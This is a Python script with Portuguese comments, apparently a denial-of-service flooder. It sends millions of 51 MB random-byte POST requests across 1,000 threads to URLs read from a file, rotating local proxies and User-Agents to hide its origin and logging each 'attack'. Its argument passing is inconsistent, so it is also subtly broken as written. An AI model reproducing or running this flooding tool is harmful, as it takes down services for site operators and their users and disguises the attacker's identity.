import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import argparse
import os
import random

# Definir proxies (se necessário)
proxies = [
    {"http": "http://127.0.0.1:8118"},
    {"http": "http://127.0.0.1:8119"},
    {"http": "http://127.0.0.1:8120"},
    {"http": "http://127.0.0.1:8121"},
    {"http": "http://127.0.0.1:8122"},
    {"http": "http://127.0.0.1:8123"},
    {"http": "http://127.0.0.1:8124"},
    {"http": "http://127.0.0.1:8125"},
]

def get_urls():
    with open("results.txt", "r") as r:
        return [ line.strip() for line in r.readlines()]
    

# Função para carregar os User-Agents a partir de um arquivo
def load_user_agents(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f.readlines()]

# Função para fazer requisição POST com payload menor e log detalhado
def make_post_request(payload_size, user_agents, session):
    try:
        urls = get_urls()
        url = random.choice(urls)
        proxy = random.choice(proxies)
        # Seleciona um User-Agent aleatório da lista
        user_agent = random.choice(user_agents)
        payload = os.urandom(payload_size)
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8',
            'Accept-Language': "en-US,en;q=0.9",
            'Content-Type': 'text/html; charset=ibm500',
            'Content-Length': str(len(payload))
        }

        start_time = time.time()

        response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=15)
        
        end_time = time.time()
        elapsed_time = end_time - start_time

        print("[+] Attacking...")
        with open("attack-log.txt", 'w') as f:
            f.writelines(f"[INFO] Status Code: {response.status_code} - URL: {url} - Response Time:{elapsed_time:.2f} - Proxy: {proxy} - Headers: {response.request.headers}")
        return response.status_code
    except Exception as e:
        print(f"[ERROR] Erro durante a requisição: {e}")
        return str(e)


def attack(url, num_requests, payload, max_workers, user_agents):
    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(make_post_request, url, payload, user_agents, session) for _ in range(num_requests)]
            
            for future in as_completed(futures):
                try:
                    status_code = future.result()
                    print(f"\n[INFO] Requisição completada com status: {status_code}")
                except Exception as e:
                    print(f"[ERRO] Erro durante a requisição: {e}")

if __name__ == "__main__":
    user_agents = load_user_agents("user-agents.txt")

    payload_size_mb = 51
    payload_size = payload_size_mb * 1024 * 1024
    
    start_time = time.time()
    
    attack(10000000, payload_size, 1000, user_agents)
    
    end_time = time.time()
    print(f"\n[INFO] Ataque realizado em {end_time - start_time:.2f} segundos.")
